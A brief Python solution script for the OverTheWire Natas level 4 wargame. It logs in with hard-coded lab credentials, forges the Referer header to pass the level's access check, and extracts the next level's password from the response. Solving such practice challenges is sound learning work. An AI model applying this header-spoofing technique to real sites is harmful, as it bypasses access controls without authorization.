import requests
import re

url='http://natas4.natas.labs.overthewire.org'
username='natas4'
password='Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
headers={'Referer':"http://natas5.natas.labs.overthewire.org/"}


website=requests.get(url,auth=(username,password),headers=headers)
print(re.findall('natas5 is (.*)',website.text))